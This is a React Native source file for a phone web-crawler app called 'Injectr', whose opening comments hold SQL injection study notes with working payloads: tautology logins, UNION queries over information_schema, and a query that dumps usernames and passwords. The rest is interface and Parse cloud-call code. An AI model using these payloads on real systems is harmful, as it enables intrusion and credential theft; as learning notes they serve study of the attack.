import { StatusBar } from "expo-status-bar";
import React, { useState, useEffect } from "react";
import {
  StyleSheet,
  Text,
  View,
  // TextInput,
  Button,
  TouchableOpacity,
  Linking,
} from "react-native";
import {
  ProgressBar,
  Colors,
  List,
  DataTable,
  Badge,
  Divider,
  TextInput,
  Avatar,
  Switch,
  Provider as PaperProvider,
} from "react-native-paper";
import { Picker } from "@react-native-community/picker";
import { AsyncStorage, Image } from "react-native";
import keys from "./constants/Keys";
import Parse, { enableEncryptedUser } from "parse/react-native";
import Modal from "react-native-modal";
import LottieAnimation from "lottie-react-native";
import { ScrollView } from "react-native-gesture-handler";
// import Ionicons from "@expo/vector-icons/Ionicons";

// To do:

// Call the parse functions from the react native app.
// Save to database and retrieve data.
// Test Everything. More UX.

///////////////////////////////////////////////////////////////
//
//
//
// SQL Injection Notes...

// table_catalog, table_type, reference_generation, user_defined_type_catalog

// 4 Types of SQL Injection Attacks:

// *** <In-band> ***
// 1. Unions. concat that good info.
// 2. Error based.
// -> SELECT CAST(SYSTEM_USER AS INT); returns "conversion failed when converting the nvarchar value 'sa' to data type init". Tells us there is a 'sa'
// *** </In-band> ***
// *** <OutOfBand> ***
// 3. Command shell. Built in sql command line to send emails etc.
// 4. Blind SQL Injection. No info back from server directy. Sleep, etc.
// -> Inject "if currentLogin = 'sa', sleep(10)"
// *** </OutOfBand> ***

//  All of this only works with dynamic sql. That means that the input is directly interpolated into the query. It all comes down to escape characters.
//  Even if you are using dynamic, you can use sp_executesql to execute the query.
//  Limit permissions.
//

// 1. Attempt to enter quotes in search. Does it give an error? What error?

// SELECT ? FROM ? WHERE ? LIKE '%yourItem%';

// SELECT ? FROM ? WHERE ? LIKE '%'%';    <---- pushes end into broken string.

// SELECT ? FROM ? WHERE ? LIKE '%';-- %';    <---- comments out broken string. Any code inserted between ; and -- will be interpreted as query structure.
// ^^^^ The above should end up searching for everything.

// Find out what actual db management software is used, to understand conventions.

// MySQL:
// SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 1 = SLEEP(2);-- %';       <--- exact command changes by software. In general, sleep is a great testing tool.
// ^^ for every hammer found, the server will wait two seconds.
// -> should include time taken to respond when writing to database.

// SELECT ?, ?, ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT 1, 2, 3 FROM dual); <-- if functional, appends these numbers onto new row in results.
// -> the number is important, because it needs to union exactly with whatever is the legit table we're querying.

// Accessing table of tables:
// SELECT ?, ?, ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);
// -> Prints out every table. We're looking for something like "users"

// SELECT ?, ?, ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users');

// SELECT ?, ?, ? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);
// -> the exact variable names will change

// *** Second Order SQL Injections ***
// -> These can thwart common protections such as parameterization by inserting a query to be used internally.
// -> example: storing a query as a username, so that upon some function such as changing your password, the injection runs.
//
//
// ...

// const ... = "Failed to login as"

// 'or 1='1       <---- Select * From Users Where Username = '' or 1='1'. Will return all users.
// 'union select table_schema from information_schema.tables union select '1     <-- similar to a prior example. returns database names.

// -> might complain about differing number of columns, so:
// 'union select 1,1, table_schema from information_schema.tables union select 1,1,'1   <--- outputs "Failed to login as 1" * users
// 'union select 3,4, table_schema from information_schema.tables union select 5,6,'7   <--- outputs "Failed to login as 4" * users and "Failed to login as 6" * 1
// -> also tells us that place two holds the name.

// 'union select 3, table_schema, 4 from information_schema.tables union select 5,6,'7  <---- outputs "...employees", "...test", "...mysql", etc.
// -> enumerates all databases. In this example, the db we want is "sqli", so:

// 'union select 3, table_name, 4 from information_schema.tables where table_schema = 'sqli' union select 5,6,'7
// -> "...Profile", "...Settings", "...Users", "...6".

// 'union select 3, column_name, 4 from information_schema.columns where table_name = 'Users' union select 5,6,'7
// -> "...userID", "...username", "...password", "...6"

// 'union all select 3, concat(username, ":", password), 4 from Users union all select 5,6,'7
// -> "...admin:secret" etc.

const testID = "ca-app-pub-3940256099942544/6300978111"; // REPLACE!
const productionID = "ca-app-pub-8766106680780906/3063045405"; // REPLACE!

Parse.setAsyncStorage(AsyncStorage);
Parse.initialize(keys.applicationId, keys.javascriptKey);
Parse.serverURL = keys.serverURL;

export default function App() {
  const styles = StyleSheet.create({
    container: {
      flex: 1,
      backgroundColor: "#fff",
      alignItems: "center",
      justifyContent: "center",
    },
    mainPage: {
      alignContent: "center",
      flexDirection: "row",
      marginLeft: 10,
      marginRight: 10,
      width: 90,
    },
    mainPage: {
      alignContent: "center",
      flexDirection: "column",
      justifyContent: "space-evenly",
    },
    content: { top: "100%" },
    cloud: {
      backgroundColor: "#d1fffc",
      borderBottomRightRadius: 10,
      borderBottomLeftRadius: 10,
      borderTopRightRadius: 10,
      borderTopLeftRadius: 10,
      paddingLeft: 10,
      paddingRight: 10,
    },
    nav: {
      // backgroundColor: "lightgray",

      backgroundColor: "#0b94d4",
      borderBottomRightRadius: 10,
      borderBottomLeftRadius: 10,
      borderTopRightRadius: 10,
      borderTopLeftRadius: 10,
      paddingTop: 20,
      paddingBottom: 20,
      paddingLeft: 40,
      paddingRight: 40,
    },
    navOn: {
      backgroundColor: "purple",
      borderBottomRightRadius: 10,
      borderBottomLeftRadius: 10,
      borderTopRightRadius: 10,
      borderTopLeftRadius: 10,
      paddingTop: 20,
      paddingBottom: 20,
      paddingLeft: 40,
      paddingRight: 40,
    },
    header: {
      backgroundColor: "#fcffed",
      borderBottomRightRadius: 10,
      borderBottomLeftRadius: 10,
      borderTopRightRadius: 10,
      borderTopLeftRadius: 10,
      paddingTop: 40,
      paddingBottom: 20,
      paddingLeft: 40,
      paddingRight: 40,
      flexDirection: "row",
    },
    headerText: {
      left: 100,
      fontSize: 20,
    },
    box: {
      backgroundColor: "#fcffed",
      borderBottomRightRadius: 10,
      borderBottomLeftRadius: 10,
      borderTopRightRadius: 10,
      borderTopLeftRadius: 10,
      paddingTop: 20,
      paddingBottom: 20,
      paddingLeft: 10,
      paddingRight: 10,
      marginBottom: 20,
      marginTop: 20,
    },
    cropped: { marginLeft: 20, marginRight: 20, borderColor: "white" },
  });
  const [currentURL, setCurrentURL] = useState(
    "https://injectable-shop.herokuapp.com/"
  );

  const [anonInt, setAnonInt] = useState(0);

  useEffect(() => {
    createInstallation = async () => {
      const Installation = Parse.Object.extend(Parse.Installation);
      const installation = new Installation();

      installation.set("deviceType", Platform.OS);

      await installation.save();
    };

    createInstallation();

    setAnonInt(Number(Math.random().toFixed(10)));
  }, []);
  const [home, setHome] = useState(true);
  const [info, setInfo] = useState(false);
  const [history, setHistory] = useState(false);
  const [historyToggle, setHistoryToggle] = useState(false);

  const NavBar = () => {
    return (
      <View
        style={{
          // top: "170%",
          alignContent: "center",
          // width: 200,
          flexDirection: "row",
          justifyContent: "space-between",
          backgroundColor: "white",
        }}
      >
        <View>
          {home ? (
            <TouchableOpacity
              style={styles.navOn}
              onPress={() => {
                setHome(true);
                setInfo(false);
                setHistory(false);
              }}
            >
              <Text style={{ color: "white" }}> Home </Text>
            </TouchableOpacity>
          ) : (
            <View></View>
          )}
          {!home ? (
            <TouchableOpacity
              style={styles.nav}
              onPress={() => {
                setHome(true);
                setInfo(false);
                setHistory(false);
              }}
            >
              <Text style={{ color: "white" }}> Home </Text>
            </TouchableOpacity>
          ) : (
            <View></View>
          )}
        </View>
        <View opacity={1}>
          {history ? (
            <TouchableOpacity
              style={styles.navOn}
              onPress={() => {
                setHome(false);
                setInfo(false);
                setHistory(true);
              }}
            >
              <Text style={{ color: "white" }}> History </Text>
            </TouchableOpacity>
          ) : (
            <View></View>
          )}
          {!history ? (
            <TouchableOpacity
              style={styles.nav}
              onPress={() => {
                setHome(false);
                setInfo(false);
                setHistory(true);
              }}
            >
              <Text style={{ color: "white" }}>History</Text>
            </TouchableOpacity>
          ) : (
            <View></View>
          )}
        </View>
        <View opacity={1}>
          {info ? (
            <TouchableOpacity
              style={styles.navOn}
              onPress={() => {
                setHome(false);
                setInfo(true);
                setHistory(false);
              }}
            >
              <Text style={{ color: "white" }}>Info</Text>
            </TouchableOpacity>
          ) : (
            <View></View>
          )}
          {!info ? (
            <TouchableOpacity
              style={styles.nav}
              onPress={() => {
                setHome(false);
                setInfo(true);
                setHistory(false);
              }}
            >
              <Text style={{ color: "white" }}>Info</Text>
            </TouchableOpacity>
          ) : (
            <View></View>
          )}
        </View>
      </View>
    );
  };

  const [userObject, setUserObject] = useState({});
  const [userID, setUserID] = useState("");
  const [createAccount, setCreateAccount] = useState(false);
  const toggleCreate = () => {
    setCreateAccount(!createAccount);
  };
  const [username, setUsername] = useState("");
  const [signInEmail, setSignInEmail] = useState("");
  const [signInPassword, setSignInPassword] = useState("");
  //
  //
  //
  const [errorSignIn, setErrorSignIn] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const [pickerVal, setPickerVal] = useState("");
  const [fullQuery, setFullQuery] = useState("");

  const [showHistory, setShowHistory] = useState(false);

  useEffect(() => {
    console.log("userObject:", userObject);
    console.log("object id: ", userObject.objectId);

    console.log(userObject.ACL);
    setUserID(userObject.objectId);
  }, [userObject]);

  const createUser = () => {
    let params = {
      username: username,
      password: signInPassword,
      email: signInEmail,
    };

    Parse.Cloud.run("createUser", params)
      .then((response) => {
        console.log("sign in response:", response);
        return JSON.parse(JSON.stringify(response));
      })
      .then((json) => {
        if (json["code"]) {
          setErrorSignIn(true);
          setErrorMessage(json["message"]);
        } else {
          setUserObject(json);
          setErrorMessage("");
          setErrorSignIn(false);
        }
      });
    setIsSignInVisible(true);
  };

  const login = () => {
    console.log("beginning login");
    let params = {
      username: username,
      password: signInPassword,
      email: signInEmail,
    };

    Parse.Cloud.run("login", params)
      .then((response) => {
        console.log("sign in response:", response, typeof response);
        console.log(JSON.stringify(response));
        console.log(JSON.parse(JSON.stringify(response)));
        return JSON.parse(JSON.stringify(response));
      })
      .then((json) => {
        console.log("received json");
        if (json["code"]) {
          setErrorSignIn(true);
          setErrorMessage(json["message"]);
        } else {
          setUserObject(json);
          setErrorMessage("");
          setGotEntries(false);
        }
      })
      .catch((error) => {
        console.log("getting error from parse for login: ");
        console.log(error);
      });
  };

  const [userEntries, setUserEntries] = useState([]);
  const [userEntriesProto, setUserEntriesProto] = useState([]);
  const [gotEntries, setGotEntries] = useState(false);

  const queryServer = () => {
    console.log("query server started.");
    const params = { uid: userID, anonInt: anonInt };

    Parse.Cloud.run("userEntries", params)
      .then((response) => {
        console.log(response);
        return JSON.parse(JSON.stringify(response));
      })
      .then((json) => {
        console.log(json);
        setUserEntries([...json].reverse());
        setUserEntriesProto([...json].reverse());
        setGotEntries(true);
        // setGotEntries(true);
        // setSortToggle(true);
        // setSortByDate(true);
        // setSortByCompleted(false);
        // setSortByManual(false);
        // setSortByType(false);

        // setHacksLoaded([...hacksLoaded, json]);

        // let newArr = [...hacksPending];

        // remove this crack from pending now...
      })
      .catch((error) => console.log(error));
  };

  const [isProgressVisible, setIsProgressVisible] = useState(false);
  const animation2 = React.createRef();
  const progress = require("./117-progress-bar.json");

  useEffect(() => {
    if (gotEntries) {
      setIsProgressVisible(false);
    }
  }, [gotEntries]);

  useEffect(() => {
    if (isProgressVisible) {
      if (animation2.current) {
        animation2.current.play();
      }
    }
  }, [isProgressVisible]);
  //

  useEffect(() => {
    console.log(userEntries);
  }, [userEntries]);

  function handleQuery() {
    setFullQuery(`${currentURL}${pickerVal}`);
  }

  function handleHistory() {
    console.log("button pressed");
    queryServer();
    setIsProgressVisible(true);
    setShowHistory(true);
    setHistoryToggle(!historyToggle);
  }

  useEffect(() => {
    if (showHistory) {
      console.log(showHistory, "history");
      handleHistory();
    }
  }, [showHistory]);

  const Header = () => {
    return (
      <View>
        {home ? (
          <Divider style={{ height: 63, backgroundColor: "black" }} />
        ) : (
          <View></View>
        )}
        <View style={styles.header}>
          <Text style={styles.headerText}>Welcome to Injectr</Text>
          <List.Icon
            style={{ bottom: 20, left: 100 }}
            icon={require("./assets/syringe.png")}
          />
        </View>
      </View>
    );
  };

  // {!showHistory ? (
  //   <View style={{ width: "90%", left: "11%", top: 30 }}>
  //     <Banner2 />
  //   </View>
  // ) : (
  //   <View></View>
  // )}

  const [isSignInVisible, setIsSignInVisible] = useState(false);

  const [instructions, setInstructions] = useState([]);
  const [instructModal, setInstructModal] = useState(false);

  const [puppetModal, setPuppetModal] = useState(false);

  const PuppetModal = () => {
    return (
      <View>
        <Modal
          isVisible={puppetModal}
          style={{ marginBottom: "3%", width: "80%", left: "5%" }}
          onRequestClose={() => setPuppetModal(false)}
        >
          <Divider
            style={{
              backgroundColor: "white",
              height: 190,
              borderTopLeftRadius: 10,
              borderTopRightRadius: 10,
              borderBottomLeftRadius: 10,
              borderBottomRightRadius: 10,
            }}
          />
          <View
            elevation={20}
            style={{
              flexDirection: "row",
              bottom: 150,
              justifyContent: "space-evenly",
            }}
          >
            <Text> Saving HTML to Your History... </Text>
          </View>
          <View style={{ bottom: 70 }}>
            <Button
              onPress={() => {
                setPuppetModal(false);
              }}
              title="OK"
            />
          </View>
        </Modal>
      </View>
    );
  };

  const addInstruction = () => {
    setInstructModal(true);
  };

  const spawnPuppet = () => {
    const params = {
      url: currentURL,
      userID,
      anonInt,
      instructions,
    };

    Parse.Cloud.run("spawnPuppet", params)
      .then((response) => {
        console.log(response);
        return response.json();
      })
      .then((json) => console.log(json));

    setPuppetModal(true);
  };

  const SignInModal = () => {
    return (
      <View>
        <Modal
          isVisible={isSignInVisible}
          style={{ marginBottom: "3%", width: "80%", left: "5%" }}
          onRequestClose={() => setIsSignInVisible(false)}
        >
          <Divider
            style={{
              backgroundColor: "white",
              height: 150,
              borderTopLeftRadius: 10,
              borderTopRightRadius: 10,
              borderBottomLeftRadius: 10,
              borderBottomRightRadius: 10,
            }}
          />
          <View style={{ bottom: 105 }}>
            <Text
              style={{
                fontWeight: "bold",
                marginLeft: "5%",
                marginRight: "5%",
                marginBottom: "3%",
                bottom: 10,
              }}
            >
              {`Please verify your email.`}
            </Text>
            <Button
              onPress={() => {
                setIsSignInVisible(false);
              }}
              title="Got it"
            />
          </View>
        </Modal>
      </View>
    );
  };

  const [elementId, setElementId] = useState("");
  const InstructModal = () => {
    return (
      <View>
        <Modal
          isVisible={instructModal}
          style={{ marginBottom: "3%", width: "80%", left: "5%" }}
          onRequestClose={() => setInstructModal(false)}
        >
          <Divider
            style={{
              backgroundColor: "white",
              height: 150,
              borderTopLeftRadius: 10,
              borderTopRightRadius: 10,
              borderBottomLeftRadius: 10,
              borderBottomRightRadius: 10,
            }}
          />
          <View
            elevation={20}
            style={{
              flexDirection: "row",
              bottom: 130,
              justifyContent: "space-evenly",
            }}
          >
            <Text> Get Element By Id: </Text>
            <TextInput
              style={{ height: 20, width: 100 }}
              onChangeText={(text) => {
                setElementId(text);
              }}
              value={elementId}
              placeholder="ID"
              // editable
            />
          </View>
          <View style={{ display: "flex", flexDirection: "row", left: "50%" }}>
            <Text style={{ color: `${!typeMode ? "blue" : "black"}` }}>
              Click
            </Text>
            <Switch
              style={{ bottom: 2, marginLeft: 4, marginRight: 0 }}
              trackColor={{ false: "#81b0ff", true: "#81b0ff" }}
              thumbColor={"#f4f3f4"}
              ios_backgroundColor="#3e3e3e"
              onValueChange={toggleType}
              value={typeMode}
            />
            <Text style={{ color: `${typeMode ? "blue" : "black"}` }}>
              Type
            </Text>
          </View>
          <View
            style={{
              bottom: 60,
              flexDirection: "row",
              justifyContent: "space-evenly",
            }}
          >
            <View style={{ width: "30%" }}>
              <Button
                onPress={() => {
                  setInstructModal(false);
                }}
                title="Add"
              />
            </View>
            <View style={{ width: "30%" }}>
              <Button
                color="red"
                onPress={() => {
                  setInstructModal(false);
                }}
                title="Cancel"
              />
            </View>
          </View>
        </Modal>
      </View>
    );
  };

  const [typeMode, setTypeMode] = useState(false);

  const [inputString, setInputString] = useState("");

  const commitInstruct = () => {
    let newArr = [...instructions];

    if (typeMode) {
      newArr.push({ type: "type", elementId, inputString });
    } else {
      newArr.push({ type: "click", elementId });
    }

    setInstructions(newArr);
  };

  const toggleType = () => {
    setTypeMode(!typeMode);
  };

  return (
    <View
      style={
        (styles.container,
        {
          flexDirection: "column",
          alignContent: "center",
          flex: 2,
          justifyContent: "space-between",
        })
      }
    >
      <Header />
      {home ? (
        <View style={styles.mainPage}>
          <View
            style={{
              justifyContent: "space-between",
              height: 300,
              marginLeft: 30,
              marginRight: 30,
              bottom: 50,
            }}
          >
            <Text style={{ fontSize: 22, bottom: 10 }}> Home </Text>
            <View style={styles.box}>
              <Text> Enter the URL you want to crawl: </Text>
              <TextInput
                style={styles.cloud}
                onChangeText={(text) => {
                  setCurrentURL(text);
                }}
                value={currentURL}
                placeholder="Enter Base URL"
                // editable
              />
            </View>
            <View style={styles.box}>
              <View>
                <Text> Webcrawler Instructions: </Text>
                <View
                  style={{
                    flexDirection: "column",
                    height: 100,
                    backgroundColor: "#d1fffc",
                    borderTopLeftRadius: 10,
                    borderTopRightRadius: 10,
                    borderBottomLeftRadius: 10,
                    borderBottomRightRadius: 10,
                  }}
                >
                  {instructions.length > 0 ? (
                    instructions.map((i) => {
                      return (
                        <Text>
                          {`-- ${i.type} - #${i.elementId} ${
                            i.inputString ? `: "${i.inputString}"` : "' "
                          }`}
                        </Text>
                      );
                    })
                  ) : (
                    <View></View>
                  )}
                  <Text style={{ fontStyle: "italic" }}>-- Print Page</Text>
                </View>
              </View>
              {puppetModal ? <PuppetModal /> : <View></View>}
              {instructModal ? (
                <View>
                  <Modal
                    isVisible={instructModal}
                    style={{ marginBottom: "3%", width: "80%", left: "5%" }}
                    onRequestClose={() => setInstructModal(false)}
                  >
                    <Divider
                      style={{
                        backgroundColor: "white",
                        height: 150,
                        borderTopLeftRadius: 10,
                        borderTopRightRadius: 10,
                        borderBottomLeftRadius: 10,
                        borderBottomRightRadius: 10,
                      }}
                    />
                    <View
                      style={{
                        flexDirection: "column",
                        justifyContent: "space-evenly",
                      }}
                    >
                      <View
                        elevation={20}
                        style={{
                          flexDirection: "row",
                          bottom: 130,
                          justifyContent: "space-evenly",
                        }}
                      >
                        <Text>Get Element By Id:</Text>
                        <TextInput
                          style={{ height: 20, width: 100 }}
                          onChangeText={(text) => {
                            setElementId(text);
                          }}
                          value={elementId}
                          placeholder="ID"
                          // editable
                        />
                      </View>
                      <View style={{ flexDirection: "row" }}>
                        <View
                          style={{
                            display: "flex",
                            flexDirection: "row",
                            bottom: 115,
                            left: 33,
                            justifyContent: "space-between",
                            width: 200,
                          }}
                        >
                          <Text
                            style={{ color: `${!typeMode ? "blue" : "black"}` }}
                          >
                            Click
                          </Text>
                          <Switch
                            style={{ bottom: 2, marginLeft: 4, marginRight: 0 }}
                            trackColor={{ false: "#81b0ff", true: "#81b0ff" }}
                            thumbColor={"#f4f3f4"}
                            ios_backgroundColor="#3e3e3e"
                            onValueChange={toggleType}
                            value={typeMode}
                          />
                          <Text
                            style={{ color: `${typeMode ? "blue" : "black"}` }}
                          >
                            Type
                          </Text>
                          <TextInput
                            disabled={!typeMode}
                            value={inputString}
                            onChangeText={(text) => {
                              setInputString(text);
                            }}
                            style={{ height: 20, width: 100, left: 37 }}
                          />
                        </View>
                      </View>
                    </View>
                    <View
                      style={{
                        bottom: 90,
                        flexDirection: "row",
                        justifyContent: "space-evenly",
                      }}
                    >
                      <View style={{ width: "30%" }}>
                        <Button
                          onPress={() => {
                            commitInstruct();
                            setInstructModal(false);
                          }}
                          title="Add"
                        />
                      </View>
                      <View style={{ width: "30%" }}>
                        <Button
                          color="red"
                          onPress={() => {
                            setInstructModal(false);
                          }}
                          title="Cancel"
                        />
                      </View>
                    </View>
                  </Modal>
                </View>
              ) : (
                <View></View>
              )}
              <View
                style={{
                  flexDirection: "row",
                  justifyContent: "space-evenly",
                  marginBottom: 20,
                }}
              >
                <View style={{ width: "35%" }}>
                  <Button title="Add" onPress={() => addInstruction()} />
                </View>
                <View style={{ width: "35%" }}>
                  <Button
                    color="red"
                    title="Clear"
                    onPress={() => setInstructions([])}
                  />
                </View>
              </View>
              <Button title="Execute" onPress={() => spawnPuppet()} />
            </View>
            <StatusBar style="auto" />
          </View>
        </View>
      ) : (
        <View></View>
      )}
      {history ? (
        <View style={styles.mainPage}>
          <View style={styles.mainColumn}>
            {!userObject.objectId ? (
              <View
                style={{
                  flexDirection: "column",
                  height: 300,
                  justifyContent: "space-evenly",
                  bottom: 100,
                }}
              >
                <View
                  style={{ display: "flex", flexDirection: "row", left: "50%" }}
                >
                  <Text
                    style={{ color: `${!createAccount ? "blue" : "black"}` }}
                  >
                    Sign In
                  </Text>
                  <Switch
                    style={{ bottom: 2, marginLeft: 4, marginRight: 0 }}
                    trackColor={{ false: "#81b0ff", true: "#81b0ff" }}
                    thumbColor={"#f4f3f4"}
                    ios_backgroundColor="#3e3e3e"
                    onValueChange={toggleCreate}
                    value={createAccount}
                  />
                  <Text
                    style={{ color: `${createAccount ? "blue" : "black"}` }}
                  >
                    Create Account
                  </Text>
                </View>
                <View style={styles.cropped}>
                  <TextInput
                    id="username"
                    style={{ height: 40, borderColor: "gray", borderWidth: 1 }}
                    onChangeText={(text) => {
                      setUsername(text);
                    }}
                    value={username}
                    placeholder="Username"
                    mode="outlined"
                    outline
                  />
                  <TextInput
                    id="signInEmail"
                    style={{ height: 40, borderColor: "gray", borderWidth: 1 }}
                    onChangeText={(text) => {
                      setSignInEmail(text);
                    }}
                    value={signInEmail}
                    placeholder="Email"
                    mode="outlined"
                  />
                  <TextInput
                    id="signInPassword"
                    style={{ height: 40, borderColor: "gray", borderWidth: 1 }}
                    onChangeText={(text) => {
                      setSignInPassword(text);
                    }}
                    value={signInPassword}
                    placeholder="Password"
                    mode="outlined"
                  />
                </View>
                {errorSignIn ? (
                  <View
                    elevation={99}
                    opacity={0.5}
                    style={{
                      backgroundColor: "red",
                      borderTopLeftRadius: 30,
                      borderTopRightRadius: 30,
                      borderBottomLeftRadius: 30,
                      borderBottomRightRadius: 30,
                      width: "80%",
                      left: "10%",
                      // bottom: 100,
                      // top: 30,
                    }}
                  >
                    <Text
                      opacity={1}
                      style={{
                        width: "90%",
                        left: "5%",
                      }}
                    >
                      {`${errorMessage}`}
                    </Text>
                  </View>
                ) : (
                  <View></View>
                )}
                {!createAccount ? (
                  <View>
                    <Button
                      style={{ width: "90%" }}
                      title="Sign In"
                      onPress={() => login()}
                    />
                  </View>
                ) : (
                  <View>
                    <Button
                      style={{ width: "90%" }}
                      title="Create Account"
                      onPress={() => createUser()}
                    />
                  </View>
                )}
              </View>
            ) : (
              <View style={{ bottom: 200 }}>
                <Text
                  style={{
                    flexDirection: "row",
                    justifyContent: "space-evenly",
                    fontWeight: "bold",
                    display: "flex",
                    marginTop: "5%",
                    marginBottom: "5%",
                    fontSize: 18,
                    textAlign: "center",
                  }}
                >
                  {`${userObject.username}: ${userObject.email}`}
                </Text>
                <Divider style={{ height: 2, backgroundColor: "black" }} />
              </View>
            )}
            {!userObject.objectId ? (
              <View style={{ bottom: 100 }}>
                <Button
                  style={{ width: "90%" }}
                  title={showHistory ? "Refresh History" : "Show History"}
                  onPress={() => handleHistory()}
                />
              </View>
            ) : (
              <View style={{ bottom: 200 }}>
                <Button
                  style={{ width: "90%" }}
                  title={showHistory ? "Refresh History" : "Show History"}
                  onPress={() => handleHistory()}
                />
              </View>
            )}
            {showHistory && !gotEntries ? (
              <View elevation={99}>
                <Divider style={{ height: 100, backgroundColor: "white" }} />
                <View style={styles.container2}>
                  <LottieAnimation
                    ref={animation2}
                    source={progress}
                    loop={true}
                    speed={2.2}
                    style={styles.lottie2}
                  />
                </View>
              </View>
            ) : (
              <View></View>
            )}
            {showHistory &&
            userEntries &&
            userEntries.length == 0 &&
            gotEntries ? (
              <View>
                <Divider style={{ height: 10, backgroundColor: "white" }} />
                <Text style={{ textAlign: "center" }}>
                  You haven 't crawled anything yet.
                </Text>
                <Divider style={{ height: 10, backgroundColor: "white" }} />
              </View>
            ) : (
              <View></View>
            )}
            {showHistory &&
            userEntries &&
            userEntries.length > 0 &&
            gotEntries ? (
              <View
                style={{
                  height: 350,
                  marginTop: -260,
                  top: 90,
                  backgroundColor: "#d1fffc",
                  borderBottomRightRadius: 10,
                  borderBottomLeftRadius: 10,
                  borderTopRightRadius: 10,
                  borderTopLeftRadius: 10,
                  paddingLeft: 10,
                  paddingRight: 10,
                  marginLeft: 10,
                  marginRight: 10,
                }}
              >
                <ScrollView style={{ height: 100, bottom: 0, margin: 5 }}>
                  {userEntries.map((entry) => {
                    return (
                      <View
                        style={{
                          backgroundColor: "#d1fffc",
                          borderBottomRightRadius: 10,
                          borderBottomLeftRadius: 10,
                          borderTopRightRadius: 10,
                          borderTopLeftRadius: 10,
                          paddingLeft: 10,
                          paddingRight: 10,
                          marginLeft: 10,
                          marginRight: 10,
                        }}
                      >
                        <Divider
                          style={{ height: 1, backgroundColor: "black" }}
                        />
                        <Text
                          style={{ fontWeight: "bold", margin: 10 }}
                        >{`${entry.url}: ${entry.createdAt}`}</Text>

                        <Text>{`${entry.html}`}</Text>
                        <Divider
                          style={{ height: 1, backgroundColor: "black" }}
                        />
                      </View>
                    );
                  })}
                </ScrollView>
              </View>
            ) : (
              <View></View>
            )}
          </View>
        </View>
      ) : (
        <View></View>
      )}
      {info ? (
        <View style={styles.mainPage}>
          <View
            style={{
              flexDirection: "column",
              justifyContent: "space-evenly",
              height: 200,
              bottom: 200,
            }}
          >
            <Text style={styles.cropped}>
              A web content scraper right on your phone, capable of interacting
              with buttons and text boxes. What could go wrong?
            </Text>
          </View>
          <View
            style={{
              flexDirection: "row",
              justifyContent: "space-evenly",
              bottom: 100,
            }}
          >
            <TouchableOpacity
              onTouchEnd={() =>
                Linking.openURL("https://www.buymeacoffee.com/jessecoyote")
              }
            >
              <View style={{ flexDirection: "row" }}>
                <Avatar.Image
                  elevation={20}
                  size={120}
                  source={require("./assets/developer.png")}
                  onTouchEnd={() =>
                    Linking.openURL("https://www.buymeacoffee.com/jessecoyote")
                  }
                />
                <Text
                  style={{
                    color: "blue",
                    position: "relative",
                    top: 45,
                    left: 40,
                    fontWeight: "bold",
                    fontSize: 17,
                  }}
                  onPress={() =>
                    Linking.openURL("https://www.buymeacoffee.com/jessecoyote")
                  }
                >
                  {"Buy Me a Coffee"}
                </Text>
              </View>
            </TouchableOpacity>
          </View>
        </View>
      ) : (
        <View></View>
      )}
      <NavBar
        style={{
          height: "20%",
          flex: 0,
          paddingTop: 100,
          backgroundColor: "white",
        }}
      />
    </View>
  );
}
